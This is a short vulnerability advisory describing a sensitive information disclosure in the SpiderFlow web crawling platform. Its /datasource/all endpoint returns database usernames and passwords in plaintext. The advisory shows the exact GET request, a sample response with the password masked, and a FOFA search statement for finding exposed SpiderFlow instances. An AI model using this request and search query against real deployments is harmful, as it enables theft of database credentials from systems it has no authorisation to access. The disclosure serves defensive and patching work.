### spider-flow Sensitive Information Disclosure

​		SpiderFlow is a next-generation open-source web crawling platform that allows users to define web crawling processes graphically without coding. Developed using springboot+layui, both frontend and backend are inseparable and can be further customized and developed. It has garnered significant popularity on GitHub with 8.8K Stars. The project’s repository is located at: https://github.com/ssssssss-team/spider-flow. 

​		The system’s /datasource/all interface is vulnerable to sensitive information disclosure, potentially allowing attackers to obtain database credentials.

​		Affected Versions: All versions

Author: 炜夜



Vulnerability Detection Method：

HTTP Request:

```request
GET /datasource/all
```

HTTP Response:

```response
HTTP/1.1 200
Content-Type: application/json; charset=utf-8
Date: Thu, 11 Jan 2024 23:39:31 GMT
Connection: close
Content-Length: 1207

[{"id":"****","name":"***","driverClassName":"com.mysql.jdbc.Driver","jdbcUrl":"jdbc:mysql://127.0.0.1:3306/","username":"root","password":"****","createDate":null}]
```



It can be observed that the plaintext information of database account and password exists in the data.



FOFA search statement

```fofa
app="SpiderFlow"
```

